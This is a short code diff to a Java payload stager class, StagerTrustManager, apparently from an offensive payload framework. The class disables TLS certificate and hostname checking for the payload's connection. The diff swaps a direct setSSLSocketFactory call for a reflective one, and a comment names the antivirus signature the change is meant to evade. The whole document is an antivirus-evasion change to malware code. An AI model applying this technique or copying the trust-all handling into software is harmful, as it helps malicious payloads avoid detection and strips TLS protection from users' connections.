@@ -46,6 +46,7 @@ import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.SSLSession;
+import javax.net.ssl.SSLSocketFactory;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 
@@ -76,7 +77,9 @@ public class StagerTrustManager implements X509TrustManager, HostnameVerifier {
             StagerTrustManager localPayloadTrustManager = new StagerTrustManager();
             SSLContext localSSLContext = SSLContext.getInstance("TLS");
             localSSLContext.init(null, new TrustManager[] { localPayloadTrustManager }, new SecureRandom());
-            localHttpsURLConnection.setSSLSocketFactory(localSSLContext.getSocketFactory());
+            HttpsURLConnection.class.getMethod("setSSLSocketFactory", 
+                              new Class[] { SSLSocketFactory.class }).invoke(localHttpsURLConnection, new Object[] { localSSLContext.getSocketFactory() });
+//            localHttpsURLConnection.setSSLSocketFactory(localSSLContext.getSocketFactory()); //Signature Java.Trojan.GenericGB.57
             localHttpsURLConnection.setHostnameVerifier(localPayloadTrustManager);
         }
     }
